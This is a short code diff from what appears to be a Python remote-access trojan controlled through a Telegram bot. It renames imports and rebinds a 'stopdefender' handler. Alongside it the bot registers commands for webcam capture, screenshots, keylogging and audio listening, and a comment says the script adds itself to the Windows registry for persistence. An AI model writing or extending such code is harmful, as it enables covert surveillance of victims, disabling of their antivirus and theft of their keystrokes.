@@ -3,8 +3,8 @@ import os
 from dotenv import load_dotenv
 from typing import Final
 from telegram.ext import Application, CommandHandler, MessageHandler, filters
-from commands import *
-from functions import add_to_registry
+from organisms import *
+from atoms import add_to_registry
 
 
 # Voeg de script toe aan registry
@@ -28,7 +28,7 @@ app.post_init = on_startup
 app.add_handler(CommandHandler('help', help_command))
 app.add_handler(CommandHandler('webcam', cam_command))
 app.add_handler(CommandHandler('ss', ss_command))
-app.add_handler(CommandHandler('stopdefender', custom_command))
+app.add_handler(CommandHandler('stopdefender', stopDefender_command))
 app.add_handler(CommandHandler('keylog', keylog_command))
 app.add_handler(CommandHandler('listen', audio_command))
 
